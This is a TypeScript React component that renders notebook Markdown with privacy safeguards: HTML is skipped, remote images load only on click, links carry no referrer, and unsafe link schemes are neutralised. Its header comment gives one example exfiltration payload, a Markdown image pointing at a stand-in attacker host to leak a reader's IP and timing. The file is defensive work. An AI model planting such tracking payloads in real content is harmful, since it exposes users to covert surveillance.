"use client";

import { memo, useState } from "react";
import ReactMarkdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";
import { Highlight, themes } from "prism-react-renderer";
import { ImageOff } from "lucide-react";

/**
 * Renders the active notebook's Markdown source safely.
 *
 * Security posture (this is a zero-knowledge notepad; the preview is
 * one of the few surfaces that can leak information about vault
 * contents to third parties, so defaults lean conservative):
 *
 *   - Raw HTML is NOT rendered. react-markdown's default is to treat
 *     HTML as literal text; we deliberately do not add `rehype-raw`.
 *   - External images are behind a click-to-load gate so a hostile
 *     author (think: someone who forced a beneficiary's vault into
 *     their own hands via Trusted Handover, then handed it back, or a
 *     coerced user pasting in someone else's note) cannot use
 *     `![](https://attacker/pixel?v=target)` to exfiltrate IP / timing
 *     the moment the vault opens.
 *   - External links open in a new tab with `noopener noreferrer` and
 *     a `no-referrer` policy — the destination site never learns that
 *     the referrer was this Flowvault URL.
 *   - Code blocks are highlighted client-side (prism-react-renderer,
 *     no network fetch, no WASM).
 *
 * This is the default-exported component so it can be pulled in via
 * `next/dynamic` and kept out of the vault-open critical path.
 */
function MarkdownPreviewImpl({ source }: { source: string }) {
  const trimmed = source.trim();
  if (trimmed.length === 0) {
    return (
      <div className="flex h-full items-center justify-center p-6 text-center text-xs text-muted">
        Nothing to preview yet. Switch to Edit and start typing.
      </div>
    );
  }
  return (
    <div className="markdown-preview h-full overflow-auto px-5 py-4 text-[14px] leading-relaxed text-foreground">
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        components={COMPONENTS}
        skipHtml
      >
        {source}
      </ReactMarkdown>
    </div>
  );
}

const EXTERNAL_LINK_SCHEMES = /^(https?:|mailto:)/i;

const COMPONENTS: Components = {
  h1: ({ children }) => (
    <h1 className="mt-6 first:mt-0 text-2xl font-semibold tracking-tight text-foreground">
      {children}
    </h1>
  ),
  h2: ({ children }) => (
    <h2 className="mt-6 text-xl font-semibold tracking-tight text-foreground">
      {children}
    </h2>
  ),
  h3: ({ children }) => (
    <h3 className="mt-5 text-lg font-semibold text-foreground">{children}</h3>
  ),
  h4: ({ children }) => (
    <h4 className="mt-4 text-base font-semibold text-foreground">{children}</h4>
  ),
  h5: ({ children }) => (
    <h5 className="mt-4 text-sm font-semibold uppercase tracking-wider text-muted">
      {children}
    </h5>
  ),
  h6: ({ children }) => (
    <h6 className="mt-4 text-xs font-semibold uppercase tracking-wider text-muted">
      {children}
    </h6>
  ),
  p: ({ children }) => (
    <p className="mt-3 first:mt-0 leading-relaxed text-foreground">{children}</p>
  ),
  ul: ({ children }) => (
    <ul className="mt-3 list-disc space-y-1 pl-6 marker:text-muted/70">
      {children}
    </ul>
  ),
  ol: ({ children }) => (
    <ol className="mt-3 list-decimal space-y-1 pl-6 marker:text-muted/70">
      {children}
    </ol>
  ),
  li: ({ children }) => <li className="leading-relaxed">{children}</li>,
  hr: () => <hr className="my-6 border-border/60" />,
  blockquote: ({ children }) => (
    <blockquote className="mt-4 rounded-r-md border-l-2 border-accent/40 bg-accent/5 px-3 py-2 text-sm italic text-muted">
      {children}
    </blockquote>
  ),
  strong: ({ children }) => (
    <strong className="font-semibold text-foreground">{children}</strong>
  ),
  em: ({ children }) => <em className="italic">{children}</em>,
  del: ({ children }) => (
    <del className="text-muted line-through">{children}</del>
  ),
  table: ({ children }) => (
    <div className="mt-4 overflow-x-auto rounded-lg border border-border">
      <table className="min-w-full border-collapse text-sm">{children}</table>
    </div>
  ),
  thead: ({ children }) => (
    <thead className="bg-background-elev-2 text-xs uppercase tracking-wider text-muted">
      {children}
    </thead>
  ),
  tr: ({ children }) => (
    <tr className="border-b border-border/60 last:border-b-0">{children}</tr>
  ),
  th: ({ children }) => (
    <th className="px-3 py-2 text-left font-medium text-foreground">
      {children}
    </th>
  ),
  td: ({ children }) => (
    <td className="px-3 py-2 align-top text-foreground">{children}</td>
  ),
  a({ href, children }) {
    const target = href ?? "";
    const isExternal = EXTERNAL_LINK_SCHEMES.test(target);
    if (isExternal) {
      return (
        <a
          href={target}
          target="_blank"
          rel="noopener noreferrer"
          referrerPolicy="no-referrer"
          className="text-accent underline-offset-2 hover:underline"
        >
          {children}
        </a>
      );
    }
    // Anchor / relative / unsupported scheme: render as plain text
    // styled like a link, so we never silently follow something like
    // `javascript:` or `data:`. react-markdown already strips most of
    // these; this is belt-and-braces.
    return <span className="text-accent">{children}</span>;
  },
  img({ src, alt }) {
    return <SafeImage src={typeof src === "string" ? src : undefined} alt={alt} />;
  },
  input(props) {
    // GFM task-list checkboxes render as `<input type="checkbox">`.
    // Keep them visible but non-interactive; editing happens in the
    // textarea, not the preview.
    if (props.type === "checkbox") {
      return (
        <input
          type="checkbox"
          checked={!!props.checked}
          readOnly
          className="mr-1.5 -mt-0.5 inline-block h-3.5 w-3.5 rounded border-border text-accent"
        />
      );
    }
    return null;
  },
  code(props) {
    const { className, children } = props;
    // Fenced code blocks arrive with a className like `language-ts`.
    // Inline code arrives without one (and without a newline).
    const match = /language-([\w-]+)/.exec(className ?? "");
    const raw = String(children ?? "");
    const isBlock =
      match !== null || raw.includes("\n") || raw.length > 60;
    if (!isBlock) {
      return (
        <code className="rounded bg-background-elev-2 px-1.5 py-0.5 font-mono text-[0.85em] text-foreground">
          {children}
        </code>
      );
    }
    const language = (match?.[1] ?? "text").toLowerCase();
    const code = raw.replace(/\n$/, "");
    return <CodeBlock code={code} language={language} />;
  },
};

function CodeBlock({ code, language }: { code: string; language: string }) {
  return (
    <div className="mt-4 overflow-hidden rounded-lg border border-border bg-[#0d0d14]">
      <div className="flex items-center justify-between border-b border-border/60 bg-background-elev-2 px-3 py-1.5">
        <span className="font-mono text-[10px] uppercase tracking-wider text-muted">
          {language}
        </span>
      </div>
      <Highlight theme={themes.vsDark} code={code} language={language}>
        {({ className, style, tokens, getLineProps, getTokenProps }) => (
          <pre
            className={`${className} overflow-x-auto px-3 py-3 text-[13px] leading-relaxed`}
            style={{ ...style, background: "transparent" }}
          >
            {tokens.map((line, i) => {
              const lineProps = getLineProps({ line });
              return (
                <div key={i} {...lineProps}>
                  {line.map((token, key) => {
                    const tokenProps = getTokenProps({ token });
                    return <span key={key} {...tokenProps} />;
                  })}
                </div>
              );
            })}
          </pre>
        )}
      </Highlight>
    </div>
  );
}

/**
 * External image placeholder: never renders `<img>` until the user
 * clicks to load. This keeps the preview consistent with Flowvault's
 * no-network-during-viewing posture (see component header for why).
 *
 * Inline `data:` images (e.g. someone pasted a screenshot as a data
 * URL) render immediately, since they don't cause a network request.
 */
function SafeImage({ src, alt }: { src: string | undefined; alt?: string }) {
  const [loaded, setLoaded] = useState(false);
  if (!src) return null;
  const isData = src.startsWith("data:image/");
  if (isData) {
    return (
      // eslint-disable-next-line @next/next/no-img-element
      <img
        src={src}
        alt={alt ?? ""}
        className="mt-3 max-w-full rounded-md border border-border/60"
      />
    );
  }
  const isExternal = EXTERNAL_LINK_SCHEMES.test(src);
  if (!isExternal) {
    // Relative paths aren't meaningful here (the vault has no asset
    // root); surface it as a broken reference rather than a silent
    // request to some unknown host.
    return <ExternalImagePlaceholder src={src} alt={alt} unsupported />;
  }
  if (loaded) {
    return (
      // eslint-disable-next-line @next/next/no-img-element
      <img
        src={src}
        alt={alt ?? ""}
        referrerPolicy="no-referrer"
        className="mt-3 max-w-full rounded-md border border-border/60"
      />
    );
  }
  return (
    <ExternalImagePlaceholder
      src={src}
      alt={alt}
      onLoad={() => setLoaded(true)}
    />
  );
}

function ExternalImagePlaceholder({
  src,
  alt,
  onLoad,
  unsupported,
}: {
  src: string;
  alt?: string;
  onLoad?: () => void;
  unsupported?: boolean;
}) {
  return (
    <span className="mt-3 flex flex-col gap-2 rounded-md border border-dashed border-border bg-background-elev-2/50 px-3 py-2 text-xs text-muted">
      <span className="inline-flex items-center gap-2">
        <ImageOff size={14} className="shrink-0 text-muted" />
        <span className="font-medium text-foreground">
          {alt && alt.length > 0 ? alt : "External image"}
        </span>
      </span>
      <span className="break-all font-mono text-[11px] text-muted/80">
        {src}
      </span>
      {unsupported ? (
        <span className="text-muted">
          Relative / unsupported scheme — not loaded.
        </span>
      ) : (
        <button
          type="button"
          onClick={onLoad}
          className="w-max rounded border border-border bg-background px-2 py-1 text-[11px] text-foreground transition-colors hover:border-accent/60 hover:text-accent"
        >
          Load image (sends a request to the host)
        </button>
      )}
    </span>
  );
}

export default memo(MarkdownPreviewImpl);
